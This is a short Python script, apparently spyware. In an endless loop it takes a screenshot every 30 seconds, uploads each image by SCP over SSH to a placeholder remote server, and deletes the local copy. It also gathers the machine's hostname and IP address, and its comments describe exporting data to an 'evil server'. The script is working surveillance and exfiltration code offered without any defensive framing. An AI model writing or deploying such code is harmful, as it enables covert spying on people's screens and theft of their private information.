import numpy as np
import cv2
import pyautogui
import PIL
from datetime import datetime
import os
import time
import paramiko
import scpclient
from scp import SCPClient
import socket


# def make_new_folder_on_evil_server():

def systeminfo_txt_file():
	h_name = socket.gethostname()
	IP_addres = socket.gethostbyname(h_name)
	print("Host Name is:" + h_name)
	print("Computer IP Address is:" + IP_addres)
	#write to file and export to evil server.

def createSSHClient(server, port, user, password):
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(server, port, user, password)
	return client

def delete_screenshot(name_f):
    os.remove(name_f)

def make_screenshot():
	today = datetime.today()
	image_type = ".png"
	str(today)
	image_name = "".join((str(today), str(image_type)))
	name = str(image_name.replace(" ", ""))
	name = name.replace(":","")
	name_f = "Image_" + str(name)
	image = pyautogui.screenshot()	
	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
	cv2.imwrite(name_f, image)
	print(name_f)
	return name_f


#---------------------------------------------------------

systeminfo_txt_file()

while True:
	n = make_screenshot()


	ssh = createSSHClient("IP-ADDR OR DOMAIN", "PORT","USER","PASSWORD")
	scp = SCPClient(ssh.get_transport())
	scp.put(n)
	delete_screenshot(n)
	time.sleep(30)







